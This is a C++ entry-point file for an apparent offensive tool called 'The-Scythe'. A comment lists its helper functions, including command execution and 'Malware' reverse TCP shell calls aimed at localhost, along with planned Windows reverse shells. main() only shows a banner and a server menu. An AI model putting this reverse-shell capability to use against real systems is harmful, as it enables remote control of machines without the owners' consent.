//
// Created by grimreaper on 3/19/23.
//
#include "modules/The-Scythe.hpp"
#include "modules/core/networking/linux_tcp_client.hpp"
#include "modules/core/networking/tcp_server.hpp"
#include "modules/utils/ui/banner.hpp"
#include "modules/utils/ui/menu.hpp"

/*
 *  ToDo {
 *  X Windows Tcp v4 Connect :
 *  TheScythe::Core::linux_Socket::windows_tcp_connect_ipv4("127.0.0.1",9002,NULL);
 *  Windows Tcp v6 Connect
 *  Windows Reverse Tcp v4
 *  Windows Reverse Tcp v6
 *  ui: page
 *  }
 *
 *  Functions i made
 *
 *  Linux and Windows {
 *  TheScythe::Utils::Encoder::b64Encode(data);
 *  TheScythe::Utils::Decoder::b64Decode(TheScythe::Utils::Encoder::b64Encode(data), decode);
 *  TheScythe::Utils::Decoder::bin_to_ip("1111111", "0", "0", "1");
 *  TheScythe::Core::Execution::exec(cmd);
 *
 *  }
 *
 *  Linux {
 *  TheScythe::Core::linux_Socket::dnsLookup4("google.com");
 *  TheScythe::Core::linux_Socket::linux_tcp_connect_ipv6(ipv6, 7002, "hi");
 *  TheScythe::Core::linux_Socket::linux_tcp_connect_ipv4(ipv4, 7002, "hi");
 *  TheScythe::Core::Malware::linux_reverse_tcp6("::1", port);
 *  TheScythe::Core::Malware::linux_reverse_tcp4("127.0.0.1", port);
 *  }
 *
 *  Windows {
 *  TheScythe::Core::linux_Socket::windows_tcp_connect_ipv4("127.0.0.1",9002,NULL);
 *
 *
 *  }
 *
 */


int main()
{

    TheScythe::Utils::Banner::banner();
    TheScythe::Utils::Menu::display_server_menu();

}